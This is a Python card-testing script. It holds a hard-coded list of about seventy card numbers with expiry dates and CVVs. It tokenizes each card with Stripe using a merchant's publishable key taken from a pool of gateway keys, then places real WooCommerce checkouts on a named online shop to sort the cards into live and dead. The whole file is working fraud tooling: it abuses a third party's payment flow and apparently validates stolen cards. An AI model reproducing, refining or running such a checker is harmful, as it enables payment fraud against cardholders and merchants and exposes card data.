"""Batch checker — directly uses Stripe tokenization + WC checkout, no subprocess."""
import asyncio, json, re, random, string, httpx
from pathlib import Path

POOL_FILE = Path(__file__).parent / "gateway_pool.json"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36"

cards_raw = """
5154620022401325|07|2026|136
5154620022103202|03|2032|392
5154620022420515|07|2027|593
5154620022257586|09|2031|212
5154620022170102|07|2028|302
5154620022518755|04|2029|950
5154620022041378|09|2030|138
5154620022302036|05|2026|619
5154620022582488|08|2027|007
5154620022666810|08|2033|667
5154620022024317|05|2032|008
5154620022870503|10|2028|978
5154620022667834|09|2026|391
5154620022318784|03|2029|735
5154620022486623|04|2031|363
5154620022570707|10|2029|396
5154620022348682|01|2028|648
5154620022565053|02|2027|214
5154620022547275|04|2030|947
5154620022407264|09|2031|684
5154620022428476|12|2029|978
5154620022215535|05|2028|988
5154620022453144|05|2030|059
5154620022403347|12|2033|487
5154620022368532|08|2031|892
5154620022601122|02|2029|107
5154620022271173|10|2031|084
5154620022157042|10|2033|996
5154620022851636|08|2031|168
5154620022376352|02|2029|059
5154620022240574|12|2027|635
5154620022871832|10|2033|879
5154620022511131|12|2027|122
5154620022442352|03|2033|195
5154620022715377|07|2030|496
5154620022640237|11|2030|843
5154620022570533|12|2028|707
5403020814844130|01|2031|725
5403027024135324|04|2030|163
5403025828110816|02|2034|308
5403023565320466|06|2030|569
5403022270031244|04|2027|254
5403021340142726|10|2028|490
5403024221161021|04|2028|835
5403023425804162|10|2027|166
5403021013200454|06|2033|166
5403024885678831|03|2032|570
5403028825072070|03|2028|849
5403027276117053|10|2027|120
5403021388841783|05|2033|413
5403020630308245|04|2030|843
5403025467022082|02|2027|510
5403028274266058|06|2027|163
5403021732637366|02|2028|778
5403022847431547|12|2034|727
5403028783031027|07|2032|489
5403022483301863|01|2031|791
5403028234176330|05|2032|893
5403025645502658|05|2028|144
5403028052310185|08|2028|068
5403028158576762|03|2028|499
5403021478587072|02|2028|811
5403020616661682|09|2033|115
5403025285056668|08|2026|519
5403021438666040|04|2032|830
5403025135147527|11|2030|288
5403028863603711|10|2033|631
5403020146806153|04|2033|830
5403021377864457|07|2030|906
5403020480420801|10|2030|514
5403027027066013|08|2034|062
"""

cards = [line.strip() for line in cards_raw.strip().split("\n") if line.strip()]

def rand_email():
    return f"test.{''.join(random.choices(string.ascii_lowercase+string.digits,k=8))}@example.com"

async def check_card(stripe_client, pk, card_str, idx, total):
    parts = card_str.split("|")
    if len(parts) != 4:
        return card_str, "PARSE_ERROR", "", ""
    pan, mm, yyyy, cvc = parts
    yy = yyyy[-2:]
    email = rand_email()
    masked = f"{pan[:6]}...{pan[-4:]}"
    
    # Step 1: Stripe tokenization — this gives us the REAL Stripe response
    try:
        tok_r = await stripe_client.post("https://api.stripe.com/v1/payment_methods",
            data={"type":"card","card[number]":pan,"card[exp_month]":mm,"card[exp_year]":yy,"card[cvc]":cvc,
                  "billing_details[name]":"John Doe","billing_details[email]":email,
                  "billing_details[address][line1]":"123 Main St","billing_details[address][city]":"New York",
                  "billing_details[address][state]":"NY","billing_details[address][postal_code]":"10001",
                  "billing_details[address][country]":"US"},
            headers={"Authorization": f"Bearer {pk}","Content-Type": "application/x-www-form-urlencoded",
                     "Origin":"https://js.stripe.com","Referer":"https://js.stripe.com/",
                     "Stripe-Version":"2023-10-16"},
            timeout=15)
        tok_d = tok_r.json()
        
        if tok_d.get("object") != "payment_method":
            err = tok_d.get("error", {})
            err_code = err.get("code", "")
            err_msg = err.get("message", "")[:80]
            decline_code = err.get("decline_code", "")
            return masked, "DEAD", f"Stripe: {decline_code or err_code}: {err_msg}", ""
        
        pm_id = tok_d["id"]
        card_info = tok_d.get("card", {})
        funding = card_info.get("funding", "?")
        three_ds = card_info.get("three_d_secure_usage", {}).get("supported", False)
        
    except Exception as e:
        return masked, "TOK_ERROR", str(e)[:50], ""
    
    # Step 2: WC Checkout to try getting real decline
    URL = "https://cleanrebellion.com"
    try:
        wc = httpx.AsyncClient(timeout=45, follow_redirects=True, headers={"User-Agent": UA})
        
        cart_r = await wc.get(f"{URL}/wp-json/wc/store/v1/cart", headers={"Accept": "application/json"})
        nonce = cart_r.headers.get("nonce", "")
        
        add_r = await wc.post(f"{URL}/wp-json/wc/store/v1/cart/add-item",
            json={"id": "9283", "quantity": 1},
            headers={"Content-Type": "application/json", "Accept": "application/json", "Nonce": nonce})
        nonce = add_r.headers.get("nonce", "") or nonce
        
        cust_r = await wc.post(f"{URL}/wp-json/wc/store/v1/cart/update-customer",
            json={"billing_address":{"first_name":"John","last_name":"Doe","address_1":"123 Main St","city":"New York","state":"NY","postcode":"10001","country":"US","email":email,"phone":"+12125551234"},
                  "shipping_address":{"first_name":"John","last_name":"Doe","address_1":"123 Main St","city":"New York","state":"NY","postcode":"10001","country":"US"}},
            headers={"Content-Type": "application/json", "Accept": "application/json", "Nonce": nonce})
        nonce = cust_r.headers.get("nonce", "") or nonce
        
        chk_r = await wc.post(f"{URL}/wp-json/wc/store/v1/checkout",
            json={"payment_method":"stripe","payment_data":[{"key":"payment_method","value":pm_id},{"key":"billing_email","value":email}],
                  "billing_address":{"first_name":"John","last_name":"Doe","address_1":"123 Main St","city":"New York","state":"NY","postcode":"10001","country":"US","email":email,"phone":"+12125551234"},
                  "shipping_address":{"first_name":"John","last_name":"Doe","address_1":"123 Main St","city":"New York","state":"NY","postcode":"10001","country":"US"}},
            headers={"Content-Type": "application/json", "Accept": "application/json", "Nonce": nonce},
            timeout=45)
        
        await wc.aclose()
        
        d = chk_r.json()
        pr = d.get("payment_result", {})
        ps = pr.get("payment_status", "")
        
        if ps == "success":
            return masked, "LIVE", "CHARGE OK!", f"3ds={three_ds} fund={funding}"
        
        decline_msg = ""
        for det in pr.get("payment_details", []):
            if det.get("key") == "errorMessage":
                decline_msg = det.get("value", "")
        
        code = d.get("code", "")
        msg = d.get("message", "")
        
        if "Missing required customer field" in (msg or decline_msg):
            return masked, "UNKNOWN", f"WC billing bug: {msg[:50]}", f"3ds={three_ds} fund={funding}"
        
        if "processing failed" in (decline_msg or "").lower() or ps == "failure":
            if three_ds:
                return masked, "UNKNOWN_3DS", f"3DS required OR real decline (WC hides real reason): {decline_msg}", f"3ds={three_ds} fund={funding}"
            else:
                return masked, "UNKNOWN_NO3DS", f"Tokenized OK, payment failed (no 3DS): {decline_msg}", f"3ds={three_ds} fund={funding}"
        
        return masked, "UNKNOWN", f"ps={ps} code={code} msg={msg[:40]}", f"3ds={three_ds} fund={funding}"
        
    except Exception as e:
        return masked, "TOK_OK_CHK_ERR", str(e)[:50], f"3ds={three_ds} fund={funding}"

async def run():
    pool = json.loads(POOL_FILE.read_text(encoding="utf-8"))
    pk = [g["pk_key"] for g in pool if "cleanrebellion" in g.get("url","")][0]
    
    print(f"Cards: {len(cards)} | Gateway: cleanrebellion.com | PK: {pk[:20]}...")
    print(f"Note: WC Store API hides real Stripe decline code. We can only tell:")
    print(f"  DEAD = Stripe rejects tokenization (bad PAN/exp/CVV)")
    print(f"  UNKNOWN_3DS = Tokenized OK + 3DS supported + payment failed (could be LIVE needing 3DS OR DEAD)")
    print(f"  UNKNOWN_NO3DS = Tokenized OK + no 3DS + payment failed (likely DEAD but not 100%)")
    print("=" * 100)
    
    sem = asyncio.Semaphore(3)
    stripe_client = httpx.AsyncClient(timeout=15, headers={"User-Agent": UA})
    
    results = []
    
    async def limited_check(card_str, idx):
        async with sem:
            r = await check_card(stripe_client, pk, card_str, idx, len(cards))
            status, reason, extra = r[1], r[2], r[3]
            icon = {"LIVE":"✓","DEAD":"✗"}.get(status, "?")
            print(f"[{idx+1:2d}/{len(cards)}] {icon} {r[0]} | {status} | {reason} | {extra}")
            return r
    
    tasks = [limited_check(c, i) for i, c in enumerate(cards)]
    results = await asyncio.gather(*tasks)
    
    await stripe_client.aclose()
    
    # Summary
    print("\n" + "=" * 100)
    print("SUMMARY:")
    live = [r for r in results if r[1] == "LIVE"]
    dead = [r for r in results if r[1] == "DEAD"]
    unk_3ds = [r for r in results if r[1] == "UNKNOWN_3DS"]
    unk_no3ds = [r for r in results if r[1] == "UNKNOWN_NO3DS"]
    other = [r for r in results if r[1] not in ("LIVE","DEAD","UNKNOWN_3DS","UNKNOWN_NO3DS")]
    
    print(f"  LIVE (charge passed):          {len(live)}")
    print(f"  DEAD (Stripe rejected token):  {len(dead)}")
    print(f"  UNKNOWN_3DS (3DS or declined):  {len(unk_3ds)}")
    print(f"  UNKNOWN_NO3DS (likely dead):   {len(unk_no3ds)}")
    print(f"  OTHER:                         {len(other)}")
    
    with open("batch_results.txt", "w", encoding="utf-8") as f:
        for r in results:
            f.write(f"{r[0]} | {r[1]} | {r[2]} | {r[3]}\n")
    print(f"\nSaved to batch_results.txt")

if __name__ == "__main__":
    asyncio.run(run())
